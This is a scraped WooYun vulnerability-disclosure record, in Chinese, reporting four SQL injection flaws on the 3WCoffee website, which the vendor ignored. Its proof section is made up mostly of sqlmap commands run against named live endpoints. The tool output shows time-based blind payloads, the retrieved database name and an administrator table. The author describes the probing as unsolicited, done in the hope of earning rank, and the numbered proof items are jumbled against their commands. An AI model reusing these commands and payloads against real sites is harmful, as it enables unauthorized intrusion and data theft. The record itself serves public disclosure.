{"id": 27357, "wybug_id": "wooyun-2015-0125979", "wybug_title": "3WCoffee主站4枚sql注入漏洞（影响管理员）", "wybug_corp": "3WCoffee", "wybug_author": "凌零1", "wybug_date": "2015-07-10 18:39", "wybug_open_date": "2015-08-24 18:40", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-10：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2015-08-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 考试，然并卵吗？ 详细说明：  今天看到有3WCoffee公布的漏洞，就去挖挖看，说不定还有rank拿   漏洞证明：  1.http://3wcoffee.com/discuz/queryTopics.json\" --data \"eventId=&size=10&start=0\" -p \"eventId\"\nC:\\Python27\\sqlmap>sqlmap.py -u \"http://3wcoffee.com/discuz/agreeRemark.json?agreecount=1&disagreecount=0&remarkId=1\" -p \"remarkId\"         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150609}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:56:41[17:56:41] [INFO] resuming back-end DBMS 'mysql'[17:56:41] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: remarkId (GET)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: agreecount=1&disagreecount=0&remarkId=1' AND (SELECT * FROM (SELECT(SLEEP(5)))jfUC) AND 'LCZh'='LCZh---[17:56:42] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.12[17:56:42] [INFO] fetched data logged to text files under 'C:\\Users\\wjl\\.sqlmap\\output\\3wcoffee.com'\n\n\n\n\nt_administrator耶2.http://3wcoffee.com/discuz/agreeRemark.json?agreecount=1&disagreecount=0&remarkId=1\" -p \"remarkId\"\nC:\\Python27\\sqlmap>sqlmap.py -u \"http://3wcoffee.com/discuz/queryTopics.json\" --data \"eventId=&size=10&start=0\" -p \"eventId\" --level 3 --current-db         _ ___ ___| |_____ ___ ___  {1.0-dev-nongit-20150609}|_ -| . | |     | .'| . ||___|_  |_|_|_|_|__,|  _|      |_|           |_|   http://sqlmap.org[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicablelocal, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program[*] starting at 17:55:31[17:55:31] [WARNING] provided value for parameter 'eventId' is empty. Please, always use only valid parameter values so sqlmap could be able to run properly[17:55:31] [INFO] resuming back-end DBMS 'mysql'[17:55:31] [INFO] testing connection to the target URLsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: eventId (POST)    Type: AND/OR time-based blind    Title: MySQL >= 5.0.12 AND time-based blind (SELECT)    Payload: eventId=' AND (SELECT * FROM (SELECT(SLEEP(5)))UQoq) AND 'VgPx'='VgPx&size=10&start=0---[17:55:32] [INFO] the back-end DBMS is MySQLweb application technology: JSPback-end DBMS: MySQL 5.0.12[17:55:32] [INFO] fetching current database[17:55:32] [WARNING] time-based comparison requires larger statistical model, please wait..............................[17:55:41] [WARNING] it is very important not to stress the network adapter during usage of time-based payloads to prevent potential errorsdo you want sqlmap to try to optimize value(s) for DBMS delay responses (option'--time-sec')? [Y/n][17:55:59] [INFO] adjusting time delay to 3 seconds due to good response times3wcoffee_newcurrent database:    '3wcoffee_new'[17:58:44] [INFO] fetched data logged to text files under 'C:\\Users\\wjl\\.sqlmap\\output\\3wcoffee.com'\n3.http://3wcoffee.com/discuz/queryRemarks.json?size=5&start=0&topicId=1   topicId\n\n4.http://3wcoffee.com/discuz/queryTopics.json eventId=&size=10&start=0           eventId\n\n   修复方案：  今天一下午就这样了！！！   版权声明：转载请注明来源 凌零1@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}